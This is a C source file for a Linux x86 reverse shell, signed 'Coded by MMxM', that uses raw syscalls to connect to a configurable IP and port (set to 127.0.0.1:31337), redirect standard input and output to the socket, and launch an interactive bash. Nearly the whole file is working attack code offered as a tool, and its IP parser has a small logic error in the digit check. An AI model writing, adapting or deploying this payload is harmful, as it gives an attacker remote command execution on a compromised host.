/*
 * Coded by MMxM
 * [root@hc0d3r C]$ date
 * Sáb Mar 28 15:23:54 BRT 2015
 * [root@hc0d3r C]$ gcc -Wall -Wextra -m32 -o linux-reverse linux-reverse.c
*/

#define IP "127.0.0.1"
#define PORT 31337
#define call "int $0x80"
#define puts(x) write(1, x);
#define shell "/bin/bash"

static char *args[] = { "bash", "-i", 0 };

struct addr_in {
	short family;
	unsigned short port;
	unsigned long ip;
	char zero[8];
};

int execve(const char *filename, char *const argv[], char *const envp[]){
	int ret;
	__asm__ volatile( call : "=a" (ret): "a" (11), "b" (filename), "c" (argv), "d" (envp) : "memory" );
	return ret;
}

int dup2(int oldfd, int newfd){
	int ret;
	__asm__ volatile( call : "=a" (ret) : "a" (63), "b" (oldfd), "c" (newfd) : "memory" );
	return ret;
}

int connect(unsigned long ip, unsigned short port){
	unsigned long x[3], ret, con[3];
	static struct addr_in address;
	int socket_fd;

	x[0]=2;x[1]=1;x[2]=0;

	__asm__ volatile( call : "=a" (socket_fd) : "a" (0x66), "b" (1) , "c" (x) : "memory" );

	if(socket_fd < 0)
		return -1;

	address.family = 2;
	address.port = (unsigned short) ((port & 0xff) << 8 | (port & 0xff00) >> 8);
	address.ip = ip;

	con[0]=socket_fd;
	con[1]=(unsigned long)&address;
	con[2]=16;

	__asm__ volatile( call : "=a" (ret) : "a" (0x66), "b" (3), "c" (con) : "memory" );

	return (!ret) ? (int)socket_fd : -1;
}

void write(int fd, const char *x){
	int i;

	for(i=0; x[i]; i++);
	__asm__ volatile( call :: "a" (4), "b" (fd), "c" (x), "d" (i) : "memory" );

}

int ip2long(const char *str, unsigned long *output){
	int X=0, pos=0, ipv4[4]={0};
	while(*str){
		if( (*str == '.' && X == 0) || pos == 4 || X == 4){
			return 0;
		}

		if(*str=='.'){
			X=0;
			pos++;
		}

		else if(*str >= '0' || *str <= '9'){
			ipv4[pos] *= 10;
			ipv4[pos] += *str-'0';
			X++;
		}

		str++;
	}

	if(!X) return 0;

	for(X=0;X<4;X++)
		if(ipv4[X] > 0xff)
			return 0;

	*output = (ipv4[3] << 24 | ipv4[2] << 16 | ipv4[1] << 8 | ipv4[0]);

	return 1;

}


int main(void){
	unsigned long ip;
	int sock_fd = 0;

	if(!ip2long(IP, &ip)){
		puts("Invalid IP !!!\n");
		return 0;
	}

	if( (sock_fd = connect(ip, PORT)) == -1) {
		puts("failed to connect\n");
		return 0;
	}

	dup2(sock_fd, 0);
	dup2(sock_fd, 1);
	dup2(sock_fd, 2);

	puts("\n[+] Reverse shell coded by MMxM (Linux x86)\n\n");
	execve(shell, args , 0);

	return 0;
}
